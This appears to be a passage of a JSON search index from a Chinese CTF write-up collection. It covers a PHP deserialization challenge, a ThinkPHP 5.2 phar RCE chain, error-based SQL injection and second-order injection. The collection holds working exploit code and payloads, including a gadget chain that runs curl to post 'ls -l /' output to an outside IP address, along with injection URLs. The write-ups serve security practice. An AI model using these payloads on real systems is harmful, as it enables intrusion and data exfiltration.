../ , ,$str); return $str; } function get_dir($path){ print_r(scandir( /tmp .$path)); } function execute() { if (in_array($this- method, array( get_dir ))) { call_user_func_array(array($this, $this- method), ($this- args)); } } } $c = new Monitor(); $d= str_replace( , \\\\ , serialize($c)); var_dump($d); ? \u6ce8\u610f\u4e24\u4e2a\u5730\u65b9\uff1a 1. $this- test =new Welcome(); \uff0c\u8fd9\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528\u903b\u8f91\u5c31\u662f\u901a\u8fc7 Monitor \u7c7b\u7684 __destruct \u65b9\u6cd5\u8c03\u7528\u5230 Welcome \u7c7b\u7684 __toString \u65b9\u6cd5\uff0c\u518d\u8c03\u7528\u5230 Come \u7c7b\u7684 execute \u65b9\u6cd5\uff0c\u8fbe\u5230\u6267\u884c\u51fd\u6570\u7684\u76ee\u7684\uff0c\u5176\u4e2d\uff0c execute \u65b9\u6cd5\u4e2d\uff0c\u7531\u4e8e\u662f $this- method \uff0c\u6240\u4ee5\u53ea\u80fd\u8c03\u7528\u7c7b\u7684\u65b9\u6cd5\uff0c\u4e0d\u80fd\u968f\u4fbf\u8c03\u7528\u7cfb\u7edf\u51fd\u6570\uff0c\u4e5f\u5c31\u662f get_dir \u65b9\u6cd5\u3002 2. $this- obj=new Come('get_dir',array('/....//var/www/html')); \u8fd9\u91cc\u4e3b\u8981\u4e24\u70b9\uff0c\u9996\u5148\u662f\u8def\u5f84\u5fc5\u987b\u4ee5\u6570\u7ec4\u7684\u5f62\u5f0f\u4f20\uff0c\u56e0\u4e3a call_user_func_array \u51fd\u6570\u8981\u6c42\u4f20\u5165\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c\u5176\u6b21\u662f\u7ed5\u8fc7waf\uff0c\u8fd9\u4e2awaf\u592a\u597d\u7ed5\u8fc7\u4e86\uff0c\u56e0\u4e3a\u8fd9\u79cd\u5229\u7528\u4e24\u4e2a str_replace() \u7684waf\uff0c\u901a\u5e38\u53ef\u4ee5\u5229\u7528\u540e\u4e00\u4e2a\u6765\u7ed5\u8fc7\u524d\u4e00\u4e2a\uff0c\u6240\u4ee5/....//\u5c31\u4f1a\u53d8\u6210/../\u5c31\u53ef\u4ee5\u8df3\u5230\u4e0a\u4e00\u76ee\u5f55\u4e86 \u4ece\u800c\u5f97\u5230payload: O:7:\\ Monitor\\ :1:{s:4:\\ test\\ ;O:7:\\ Welcome\\ :2:{s:3:\\ obj\\ ;O:4:\\ Come\\ :2:{s:6:\\ method\\ ;s:7:\\ get_dir\\ ;s:4:\\ args\\ ;a:1:{i:0;s:19:\\ /....//var/www/html\\ ;}}s:3:\\ var\\ ;s:7:\\ {$_GET}\\ ;}} \u4e5f\u662f\u8981\u6ce8\u610f\uff0c\u91cc\u9762\u7684\u53cc\u5f15\u53f7\u524d\u9762\u8bb0\u5f97\u52a0\u4e0a\\\u4f5c\u4e3a\u8f6c\u4e49\u7b26\uff0c\u5e76\u4e14\u6700\u524d\u9762\u7684O\u4e4b\u524d\u9700\u8981\u52a0\u4e00\u4e2a | ,\u8fd9\u90fd\u662fphp_session\u53cd\u5e8f\u5217\u5316\u7684\u683c\u5f0f \u6700\u540e\u8bf4\u4e00\u70b9\uff0c\u8fd9\u9898\u76ee\u6743\u9650\u7ed9\u7684\u5f88\u4f4e\uff0c\u6211\u5f53\u65f6\u8bfb\u53d6\u6839\u76ee\u5f55\u90fd\u65e0\u6cd5\u8bfb\u53d6\uff0c\u6574\u4e2a\u7cfb\u7edf\u4f3c\u4e4e\u5c31/tmp\u4e0e/var/www/html\u6709\u8bfb\u6743\u9650\uff0c\u8fd9\u5176\u5b9e\u633a\u5751\u7684\u3002\u3002\u5bb3\u5f97\u6211\u4e00\u5ea6\u6000\u7591\u4eba\u751f\u3002 \u6709\u4e00\u8bf4\u4e00\uff0c\u8fd9\u4e2a\u9898\u62ff\u6765\u7ec3\u4e60\u505a\u597d\u4e0d\u8fc7\u4e86\uff0c\u51c6\u5907\u7b49\u5b66\u5f1f\u5b66\u53cd\u5e8f\u5217\u5316\u4e86\uff0c\u8003\u8003\u4ed6\u4eec(\u6211\u771f\u8fc7\u5206)\u3002","title":"ictf_best_language1_writeup"},{"location":"web/RCE/Redhat2019_Ticket_System/","text":"Ticket_System Upload your Ticket. \u8003\u70b9 XXE tp5.2 rce popen \u505a\u9898\u8fc7\u7a0b \u89c2\u5bdf\u7f51\u9875\u6e90\u7801\uff0c\u53d1\u73b0\u5173\u952ejs\u6587\u4ef6main.js\uff1a \u5c1d\u8bd5\u4e00\u4e0bXXE\uff0c\u53d1\u73b0\u53ef\u4ee5\u6210\u529f\u8bfb\u53d6\u6587\u4ef6\uff1a \u4f46\u662f\u5c1d\u8bd5except\u65e0\u6cd5\u6210\u529f\u6267\u884c\uff0c\u5e94\u8be5\u662fPHP\u6ca1\u6709\u5b89\u88c5\u8be5\u6269\u5c55\u3002 \u63d0\u793a\u7684\u610f\u601d\u5e94\u8be5\u662f\u8bf4flag\u4e0d\u5728web\u76ee\u5f55\u4e0b\uff0c\u800c\u662f\u5728\u7cfb\u7edf\u7684root\u76ee\u5f55\u4e0b\uff0c\u76f4\u63a5XXE\u8bfb\u53d6\u6743\u9650\u4e0d\u8db3\uff0c\u9700\u8981\u5176\u4ed6\u7684\u65b9\u5f0f\u3002 \u8bfb\u53d6hints.txt\u7684\u5185\u5bb9\uff1a You'r clever. But not enough. Try RCE! \u5e94\u8be5\u662f\u8981\u627etp5.2\u7684RCE\u94fe\uff0c\u4e4b\u524dSmile\u5e08\u5085\u7684\u6587\u7ae0\u91cc\u8bb2\u8fc7\uff0c\u76f4\u63a5\u62ff\u6765\u7528\u4e86\uff1a https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage ?php namespace think\\process\\pipes { class Windows { private $files ; public function __construct ( $files ) { $this - files = array ( $files ); } } } namespace think\\model\\concern { trait Conversion { protected $append = array ( Smi1e = 1 ); } trait Attribute { private $data ; private $withAttr = array ( Smi1e = system ); public function get ( $system ) { $this - data = array ( Smi1e = $system ); } } } namespace think { abstract class Model { use model\\concern\\Attribute ; use model\\concern\\Conversion ; } } namespace think\\model { use think\\Model ; class Pivot extends Model { public function __construct ( $system ) { $this - get ( $system ); } } } namespace { $Conver = new think\\model\\Pivot ( curl http://101.200.47.157/ -d `ls -l /` ; ); $payload = new think\\process\\pipes\\Windows ( $Conver ); @ unlink ( phar.phar ); $phar = new Phar ( phar.phar ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar - startBuffering (); $phar - setStub ( GIF89a ?php __HALT_COMPILER(); ? ); //\u8bbe\u7f6estub $phar - setMetadata ( $payload ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar - addFromString ( test.txt , test ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar - stopBuffering (); echo urlencode ( serialize ( $payload )); } ? \uff08\u505a\u9898\u7684\u65f6\u5019\u8d76\u65f6\u95f4\u6ca1\u622a\u56fe\uff0c\u590d\u73b0\u7684\u65f6\u5019\uff0c\u53d1\u73b0/tmp\u88ab\u4eba\u52a8\u624b\u811a\u4e86\uff0c\u6ca1\u6cd5\u4e0a\u4f20Phar\uff0c\u4e0b\u9762\u53ea\u80fd\u6587\u5b57\u8bf4\u660e\uff09 \u8fdb\u53bb\u4e4b\u540e\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u6839\u76ee\u5f55\u7684flag\uff0c\u6743\u9650\u4e0d\u8db3\uff0c\u5206\u6790\u62e5\u6709\u8005\u4e3awww-data\u3002 \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2areadflag\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5206\u6790\u4e86\u4e00\u6ce2\u4e4b\u540e\uff0c\u53d1\u73b0\u548c*CTF\u7684\u4e00\u6a21\u4e00\u6837\uff0c\u4e8e\u662f\u76f4\u63a5\u62ff\u5f53\u65f6fish\u5e08\u5085\u7684\u811a\u672c\u6765\u8dd1\u4e86\u3002 ?php $descriptorspec = array ( 0 = array ( pipe , r ), // \u6807\u51c6\u8f93\u5165\uff0c\u5b50\u8fdb\u7a0b\u4ece\u6b64\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e 1 = array ( pipe , w ), // \u6807\u51c6\u8f93\u51fa\uff0c\u5b50\u8fdb\u7a0b\u5411\u6b64\u7ba1\u9053\u4e2d\u5199\u5165\u6570\u636e 2 = array ( file , /tmp/.a/error-output.txt , a ) // \u6807\u51c6\u9519\u8bef\uff0c\u5199\u5165\u5230\u4e00\u4e2a\u6587\u4ef6 ); $cwd = / ; $env = array (); $process = proc_open ( /readflag , $descriptorspec , $pipes , $cwd , $env ); if ( is_resource ( $process )) { $a = fread ( $pipes [ 1 ], 1024 ); $a = fread ( $pipes [ 1 ], 1024 ); $a = explode ( \\n , $a ); eval ( \\$ result = $a[0] ; ); echo ( \\$ result = $a[0] ; ); fwrite ( $pipes [ 0 ], $result\\n ); var_dump ( fread ( $pipes [ 1 ], 1024 )); var_dump ( fread ( $pipes [ 1 ], 1024 )); var_dump ( fread ( $pipes [ 1 ], 1024 )); fclose ( $pipes [ 0 ]); fclose ( $pipes [ 1 ]); $return_value = proc_close ( $process ); echo command returned $return_value\\n ; } ? flag{3ff32148-e229-41fd-b7b9-d09e76d35daf}","title":"Redhat2019_Ticket_System"},{"location":"web/RCE/Redhat2019_Ticket_System/#ticket_system","text":"Upload your Ticket.","title":"Ticket_System"},{"location":"web/RCE/Redhat2019_Ticket_System/#_1","text":"XXE tp5.2 rce popen","title":"\u8003\u70b9"},{"location":"web/RCE/Redhat2019_Ticket_System/#_2","text":"\u89c2\u5bdf\u7f51\u9875\u6e90\u7801\uff0c\u53d1\u73b0\u5173\u952ejs\u6587\u4ef6main.js\uff1a \u5c1d\u8bd5\u4e00\u4e0bXXE\uff0c\u53d1\u73b0\u53ef\u4ee5\u6210\u529f\u8bfb\u53d6\u6587\u4ef6\uff1a \u4f46\u662f\u5c1d\u8bd5except\u65e0\u6cd5\u6210\u529f\u6267\u884c\uff0c\u5e94\u8be5\u662fPHP\u6ca1\u6709\u5b89\u88c5\u8be5\u6269\u5c55\u3002 \u63d0\u793a\u7684\u610f\u601d\u5e94\u8be5\u662f\u8bf4flag\u4e0d\u5728web\u76ee\u5f55\u4e0b\uff0c\u800c\u662f\u5728\u7cfb\u7edf\u7684root\u76ee\u5f55\u4e0b\uff0c\u76f4\u63a5XXE\u8bfb\u53d6\u6743\u9650\u4e0d\u8db3\uff0c\u9700\u8981\u5176\u4ed6\u7684\u65b9\u5f0f\u3002 \u8bfb\u53d6hints.txt\u7684\u5185\u5bb9\uff1a You'r clever. But not enough. Try RCE! \u5e94\u8be5\u662f\u8981\u627etp5.2\u7684RCE\u94fe\uff0c\u4e4b\u524dSmile\u5e08\u5085\u7684\u6587\u7ae0\u91cc\u8bb2\u8fc7\uff0c\u76f4\u63a5\u62ff\u6765\u7528\u4e86\uff1a https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage ?php namespace think\\process\\pipes { class Windows { private $files ; public function __construct ( $files ) { $this - files = array ( $files ); } } } namespace think\\model\\concern { trait Conversion { protected $append = array ( Smi1e = 1 ); } trait Attribute { private $data ; private $withAttr = array ( Smi1e = system ); public function get ( $system ) { $this - data = array ( Smi1e = $system ); } } } namespace think { abstract class Model { use model\\concern\\Attribute ; use model\\concern\\Conversion ; } } namespace think\\model { use think\\Model ; class Pivot extends Model { public function __construct ( $system ) { $this - get ( $system ); } } } namespace { $Conver = new think\\model\\Pivot ( curl http://101.200.47.157/ -d `ls -l /` ; ); $payload = new think\\process\\pipes\\Windows ( $Conver ); @ unlink ( phar.phar ); $phar = new Phar ( phar.phar ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar - startBuffering (); $phar - setStub ( GIF89a ?php __HALT_COMPILER(); ? ); //\u8bbe\u7f6estub $phar - setMetadata ( $payload ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar - addFromString ( test.txt , test ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar - stopBuffering (); echo urlencode ( serialize ( $payload )); } ? \uff08\u505a\u9898\u7684\u65f6\u5019\u8d76\u65f6\u95f4\u6ca1\u622a\u56fe\uff0c\u590d\u73b0\u7684\u65f6\u5019\uff0c\u53d1\u73b0/tmp\u88ab\u4eba\u52a8\u624b\u811a\u4e86\uff0c\u6ca1\u6cd5\u4e0a\u4f20Phar\uff0c\u4e0b\u9762\u53ea\u80fd\u6587\u5b57\u8bf4\u660e\uff09 \u8fdb\u53bb\u4e4b\u540e\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u6839\u76ee\u5f55\u7684flag\uff0c\u6743\u9650\u4e0d\u8db3\uff0c\u5206\u6790\u62e5\u6709\u8005\u4e3awww-data\u3002 \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2areadflag\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5206\u6790\u4e86\u4e00\u6ce2\u4e4b\u540e\uff0c\u53d1\u73b0\u548c*CTF\u7684\u4e00\u6a21\u4e00\u6837\uff0c\u4e8e\u662f\u76f4\u63a5\u62ff\u5f53\u65f6fish\u5e08\u5085\u7684\u811a\u672c\u6765\u8dd1\u4e86\u3002 ?php $descriptorspec = array ( 0 = array ( pipe , r ), // \u6807\u51c6\u8f93\u5165\uff0c\u5b50\u8fdb\u7a0b\u4ece\u6b64\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e 1 = array ( pipe , w ), // \u6807\u51c6\u8f93\u51fa\uff0c\u5b50\u8fdb\u7a0b\u5411\u6b64\u7ba1\u9053\u4e2d\u5199\u5165\u6570\u636e 2 = array ( file , /tmp/.a/error-output.txt , a ) // \u6807\u51c6\u9519\u8bef\uff0c\u5199\u5165\u5230\u4e00\u4e2a\u6587\u4ef6 ); $cwd = / ; $env = array (); $process = proc_open ( /readflag , $descriptorspec , $pipes , $cwd , $env ); if ( is_resource ( $process )) { $a = fread ( $pipes [ 1 ], 1024 ); $a = fread ( $pipes [ 1 ], 1024 ); $a = explode ( \\n , $a ); eval ( \\$ result = $a[0] ; ); echo ( \\$ result = $a[0] ; ); fwrite ( $pipes [ 0 ], $result\\n ); var_dump ( fread ( $pipes [ 1 ], 1024 )); var_dump ( fread ( $pipes [ 1 ], 1024 )); var_dump ( fread ( $pipes [ 1 ], 1024 )); fclose ( $pipes [ 0 ]); fclose ( $pipes [ 1 ]); $return_value = proc_close ( $process ); echo command returned $return_value\\n ; } ? flag{3ff32148-e229-41fd-b7b9-d09e76d35daf}","title":"\u505a\u9898\u8fc7\u7a0b"},{"location":"web/SQLi/RootersCTF-Babyweb/","text":"RootersCTF-Babyweb My junior dev just set up a password protected webpage. Can you get in? \u5206\u6790\u8fc7\u7a0b \u6253\u5f00\u94fe\u63a5\u63d0\u793a\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u662f18\u4f4d\uff0c\u5e76\u4e14\u8fc7\u6ee4\u6389\u4e86UNION SLEEP ' \" OR - BENCHMARK\u3002\u56e0\u6b64\u5229\u7528\u7206\u7834\u51fa\u5bc6\u7801\u662f\u6bd4\u8f83\u4e0d\u73b0\u5b9e\u7684\uff0c\u7ed3\u5408\u9898\u76ee\u63d0\u793a\u662f\u4f7f\u7528\u6ce8\u5165\u65b9\u6cd5\u3002\u770b\u5230\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u731c\u6d4b\u662f\u88ab\u53cd\u659c\u6760\u8f6c\u4e49\u6389\uff0c\u4fbf\u5c1d\u8bd5\u5bbd\u5b57\u8282\u6ce8\u5165\uff0c\u4f7f\u7528 %df%27 \u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u6ce8\u5165\u5931\u8d25\u3002 \u5e76\u4e14\u63d0\u793aUNION\u3001OR\u4e5f\u90fd\u88ab\u8fc7\u6ee4\uff0c\u539f\u672c\u60f3\u7740\u5229\u7528\u5927\u5c0f\u5199\u6216\u8005\u7f16\u7801\u7ed5\u8fc7\uff0c\u4f46\u662f\u5f15\u53f7\u65e2\u7136\u4e0d\u80fd\u6210\u529f\u7ed5\u8fc7\uff0c\u8bf4\u660e\u4e0d\u80fd\u7528\u95ed\u5408\u5f15\u53f7\u8fdb\u884c\u6ce8\u5165\u3002\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\u53d1\u73b0\u5229\u7528 extractvalue() \u51fd\u6570\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u53ef\u4ee5\u6210\u529f\u5b9e\u73b0\u6ce8\u5165,\u56e0\u6b64\u53ef\u4ee5\u7ed3\u5408concat\u51fd\u6570\u5b9e\u73b0\u6ce8\u5165\u3002 extractvalue() \uff1a\u51fd\u6570\u529f\u80fd\u662f\u4ece\u76ee\u6807XML\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32\u3002 EXTRACTVALUE (XML_document, XPath_string); \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u6587\u4e2d\u4e3aDoc \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string (Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32) extractvalue\u6ce8\u5165\u7684\u539f\u7406\uff1a\u5982\u540cupdatexml\u4e00\u6837\uff0cextract\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8981\u6c42\u662fxpath\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u800c\u6211\u4eec\u8f93\u5165\u7684\u5e76\u4e0d\u662f\u3002\u6240\u4ee5\u62a5\u9519\u3002 \u6ce8\u5165\u8fc7\u7a0b 1\u3001\u7206\u5e93\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) br \u56de\u663eXPATH syntax error:~SQLinjection~\uff0c\u7206\u51fa\u4e86\u5e93\u540dSQLinjection 2\u3001\u7206\u8868\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) br \u56de\u663eXPATH syntax error:~users~\uff0c\u7206\u51fa\u4e86\u8868\u540dusers \u8fd9\u91cc\u9700\u8981\u8bf4\u540d\u4e00\u4e0b\uff0c\u7531\u4e8e\u5355\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u6545\u6ce8\u5165\u8bed\u53e5\u4e2d\u5982\u679c\u6709\u5b57\u7b26\u4e32\u9700\u8981\u5355\u53cc\u5f15\u53f7\uff0c\u5e94\u5f53\u5c3d\u91cf\u907f\u514d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u67e5\u8be2\u8bed\u53e5\u7684\u591a\u91cd\u5229\u7528\u907f\u514d\uff0c\u5f53\u7136\u76f4\u63a5\u586b\u5e93\u540d\u4e5f\u662f\u4e0d\u9700\u8981\u5355\u53cc\u5f15\u53f7\u7684\uff08\u4e0b\u9762\u8868\u540d\u540c\u7406\uff09\u3002 3\u3001\u7206\u5217\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) br \u56de\u663eXPATH syntax error:~user\u3001uniqueid~\uff0c\u7206\u51fa\u5217\u540duser\u3001uniqueid\uff0c\u8fd9\u4e24\u4e2a\u5217\u91cc\u80af\u5b9a\u6709\u6211\u4eec\u9700\u8981\u7684\u91cd\u8981\u5185\u5bb9\u3002 4\u3001\u7206\u5b57\u6bb5 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(selcet uniqueid/user from users limit 1),0x7e)); br \u8fd9\u91cc\u5206\u4e24\u6b65\u5206\u522b\u7206\u51faadmin\u548c\u5176\u5bf9\u5e94\u768418\u4f4d\u7684uniqueid\uff0c\u62ff\u53bb\u5c1d\u8bd5\u767b\u5f55\uff0c\u6210\u529f\u767b\u8def\u5e76\u62ff\u5230flag\u3002 \u7531\u4e8e\u73af\u5883\u4e0d\u80fd\u590d\u73b0\uff0c\u505a\u9898\u7684\u65f6\u5019\u4e5f\u6ca1\u6709\u622a\u56fe\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d34\u51fa\u56fe\u7247\u3002 \u62a5\u9519\u6ce8\u5165\u53c2\u8003\u94fe\u63a5\uff1a https://www.jianshu.com/p/bf5edd484957","title":"RootersCTF-Babyweb"},{"location":"web/SQLi/RootersCTF-Babyweb/#rootersctf-babyweb","text":"My junior dev just set up a password protected webpage. Can you get in?","title":"RootersCTF-Babyweb"},{"location":"web/SQLi/RootersCTF-Babyweb/#_1","text":"\u6253\u5f00\u94fe\u63a5\u63d0\u793a\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u662f18\u4f4d\uff0c\u5e76\u4e14\u8fc7\u6ee4\u6389\u4e86UNION SLEEP ' \" OR - BENCHMARK\u3002\u56e0\u6b64\u5229\u7528\u7206\u7834\u51fa\u5bc6\u7801\u662f\u6bd4\u8f83\u4e0d\u73b0\u5b9e\u7684\uff0c\u7ed3\u5408\u9898\u76ee\u63d0\u793a\u662f\u4f7f\u7528\u6ce8\u5165\u65b9\u6cd5\u3002\u770b\u5230\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u731c\u6d4b\u662f\u88ab\u53cd\u659c\u6760\u8f6c\u4e49\u6389\uff0c\u4fbf\u5c1d\u8bd5\u5bbd\u5b57\u8282\u6ce8\u5165\uff0c\u4f7f\u7528 %df%27 \u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u6ce8\u5165\u5931\u8d25\u3002 \u5e76\u4e14\u63d0\u793aUNION\u3001OR\u4e5f\u90fd\u88ab\u8fc7\u6ee4\uff0c\u539f\u672c\u60f3\u7740\u5229\u7528\u5927\u5c0f\u5199\u6216\u8005\u7f16\u7801\u7ed5\u8fc7\uff0c\u4f46\u662f\u5f15\u53f7\u65e2\u7136\u4e0d\u80fd\u6210\u529f\u7ed5\u8fc7\uff0c\u8bf4\u660e\u4e0d\u80fd\u7528\u95ed\u5408\u5f15\u53f7\u8fdb\u884c\u6ce8\u5165\u3002\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\u53d1\u73b0\u5229\u7528 extractvalue() \u51fd\u6570\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u53ef\u4ee5\u6210\u529f\u5b9e\u73b0\u6ce8\u5165,\u56e0\u6b64\u53ef\u4ee5\u7ed3\u5408concat\u51fd\u6570\u5b9e\u73b0\u6ce8\u5165\u3002 extractvalue() \uff1a\u51fd\u6570\u529f\u80fd\u662f\u4ece\u76ee\u6807XML\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32\u3002 EXTRACTVALUE (XML_document, XPath_string); \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u6587\u4e2d\u4e3aDoc \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string (Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32) extractvalue\u6ce8\u5165\u7684\u539f\u7406\uff1a\u5982\u540cupdatexml\u4e00\u6837\uff0cextract\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8981\u6c42\u662fxpath\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u800c\u6211\u4eec\u8f93\u5165\u7684\u5e76\u4e0d\u662f\u3002\u6240\u4ee5\u62a5\u9519\u3002","title":"\u5206\u6790\u8fc7\u7a0b"},{"location":"web/SQLi/RootersCTF-Babyweb/#_2","text":"1\u3001\u7206\u5e93\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) br \u56de\u663eXPATH syntax error:~SQLinjection~\uff0c\u7206\u51fa\u4e86\u5e93\u540dSQLinjection 2\u3001\u7206\u8868\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) br \u56de\u663eXPATH syntax error:~users~\uff0c\u7206\u51fa\u4e86\u8868\u540dusers \u8fd9\u91cc\u9700\u8981\u8bf4\u540d\u4e00\u4e0b\uff0c\u7531\u4e8e\u5355\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u6545\u6ce8\u5165\u8bed\u53e5\u4e2d\u5982\u679c\u6709\u5b57\u7b26\u4e32\u9700\u8981\u5355\u53cc\u5f15\u53f7\uff0c\u5e94\u5f53\u5c3d\u91cf\u907f\u514d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u67e5\u8be2\u8bed\u53e5\u7684\u591a\u91cd\u5229\u7528\u907f\u514d\uff0c\u5f53\u7136\u76f4\u63a5\u586b\u5e93\u540d\u4e5f\u662f\u4e0d\u9700\u8981\u5355\u53cc\u5f15\u53f7\u7684\uff08\u4e0b\u9762\u8868\u540d\u540c\u7406\uff09\u3002 3\u3001\u7206\u5217\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) br \u56de\u663eXPATH syntax error:~user\u3001uniqueid~\uff0c\u7206\u51fa\u5217\u540duser\u3001uniqueid\uff0c\u8fd9\u4e24\u4e2a\u5217\u91cc\u80af\u5b9a\u6709\u6211\u4eec\u9700\u8981\u7684\u91cd\u8981\u5185\u5bb9\u3002 4\u3001\u7206\u5b57\u6bb5 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(selcet uniqueid/user from users limit 1),0x7e)); br \u8fd9\u91cc\u5206\u4e24\u6b65\u5206\u522b\u7206\u51faadmin\u548c\u5176\u5bf9\u5e94\u768418\u4f4d\u7684uniqueid\uff0c\u62ff\u53bb\u5c1d\u8bd5\u767b\u5f55\uff0c\u6210\u529f\u767b\u8def\u5e76\u62ff\u5230flag\u3002 \u7531\u4e8e\u73af\u5883\u4e0d\u80fd\u590d\u73b0\uff0c\u505a\u9898\u7684\u65f6\u5019\u4e5f\u6ca1\u6709\u622a\u56fe\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d34\u51fa\u56fe\u7247\u3002 \u62a5\u9519\u6ce8\u5165\u53c2\u8003\u94fe\u63a5\uff1a https://www.jianshu.com/p/bf5edd484957","title":"\u6ce8\u5165\u8fc7\u7a0b"},{"location":"web/SQLi/UNCTF2019-Twice_Insert/","text":"UNCTF-Twice_Insert \u539f\u7406\u5206\u6790 \u9898\u76ee\u63d0\u793atwice-insert\uff0c\u5206\u6790\u662f\u5229\u7528\u4e8c\u6b21\u6ce8\u5165\u83b7\u53d6admin\u5bc6\u7801\u6216\u8005\u662f\u66b4\u5e93\u62ffflag\u3002 \u89e3\u9898\u8fc7\u7a0b 1\uff09\u8bbf\u95ee\u76ee\u6807\u4e3b\u673a\uff0c\u6253\u5f00\u9875\u9762\u53d1\u73b0\u662f sqli-labs-24 \uff0c\u539f\u9898\u662f\u5229\u7528 \u4e8c\u6b21\u6ce8\u5165 \u4fee\u6539admin\u5bc6\u7801\uff0c\u8fd9\u9898\u4fee\u6539admin\u5bc6\u7801\u5374\u6ca1\u6709flag\uff0c\u8981\u60f3\u62ff\u5230flag\u53ef\u80fd\u9700\u8981\u7206\u5e93\u3002 2\uff09\u6839\u636e\u9898\u610f\uff0c\u5c1d\u8bd5\u5e03\u5c14\u76f2\u6ce8 * \u53d1\u73b0 or \u88ab\u8fc7\u6ee4\uff0c\u5982\u6b64\u9700\u8981\u6362\u4e00\u4e2a\u601d\u8def\uff0c\u56e0\u4e3a\u6709\u6ce8\u518c\u6309\u94ae\uff0c\u5c1d\u8bd5\u6ce8\u518c\u65b0\u7528\u6237\u3002 3)\u6ce8\u518c\u4e00\u4e2a\u65b0\u7528\u6237 scl \uff0cpassword\u4e3a 1 \uff0c\u7136\u540e\u6ce8\u518c\u7528\u6237 scl\u2019and 1# \uff08\u8be5\u7528\u6237\u540d\u7528\u4e8e\u6d4b\u8bd5\u6ce8\u5165\uff09\uff0cpassword\u4e3a 1 \uff0c\u7528\u4e8e\u540e\u9762\u7684\u6d4b\u8bd5 \u4fee\u6539\u7528\u6237 scl\u2019and 1# \u7684\u5bc6\u7801\u4e3a 0 \u4fee\u6539\u6210\u529f\uff1a 4)\u5c06scl\u7684\u5bc6\u7801\u91cd\u7f6e\u4e3a 1 \uff1a\u6ce8\u518c\u65b0\u7684\u7528\u6237 scl\u2019and 0# \uff0cpassword\u4e3a 1 \uff0c\u7136\u540e\u767b\u9646\u8be5\u8d26\u53f7\u4fee\u6539\u5bc6\u7801 \u56de\u663e\u5982\u4e0b\uff1a \u5bc6\u7801\u66f4\u65b0\u5931\u8d25\uff0c\u8bf4\u660e\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8\u3002 